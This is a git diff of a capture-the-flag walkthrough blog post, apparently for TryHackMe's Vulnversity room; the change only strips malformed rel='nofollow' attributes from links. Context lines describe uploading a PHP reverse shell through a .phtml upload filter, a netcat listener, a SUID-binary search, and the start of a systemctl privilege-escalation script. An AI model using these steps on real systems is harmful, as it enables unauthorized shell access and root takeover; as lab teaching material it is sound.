@@ -105,7 +105,7 @@ As we can see .phtml returns 'Success'. This is the extension we will be using w
 <img src="/assets/img/uploads/vulnversity/attack.png">
 </center>
 
-I will use the webshell from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel=”nofollow”> pentest monkey,</a> you can use any shell you like, change the IP and port in the shell and upload it to the server. After uploading, we can find it at /internal/uploads/.
+I will use the webshell from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> pentest monkey,</a> you can use any shell you like, change the IP and port in the shell and upload it to the server. After uploading, we can find it at /internal/uploads/.
 
 ```r
 m1m3@kali:~$ nc -lvnp 9001
@@ -149,7 +149,7 @@ www-data@vulnuniversity:/bin$ find / -user root -perm -4000 -exec ls -ldb {} \; 
 ...
 ```
 
-Looking at the output of the command, we can see that systemctl had a suid bit active. Searching on the <a href="https://gtfobins.github.io/gtfobins/systemctl/" rel=”nofollow”>GTFO Bins,</a> I found that we can exploit systemctl for privilege escalation. Copy and execute the following script into the /bin directory.
+Looking at the output of the command, we can see that systemctl had a suid bit active. Searching on the <a href="https://gtfobins.github.io/gtfobins/systemctl/">GTFO Bins,</a> I found that we can exploit systemctl for privilege escalation. Copy and execute the following script into the /bin directory.
 
 ```sh
 TF=$(mktemp).service
@@ -174,4 +174,4 @@ www-data@vulnuniversity:/bin$
 That’s it! Thanks for reading! Make sure to stay tuned for more upcoming Try Hack Me walkthroughs!
 If you have any queries, you can contact me <a href="/contact">here.</a>
 
-NOTE: The awesome artwork used in this article was created by <a href="https://swadeillustration.com" rel=”nofollow”>Swade.</a>
+NOTE: The awesome artwork used in this article was created by <a href="https://swadeillustration.com">Swade.</a>
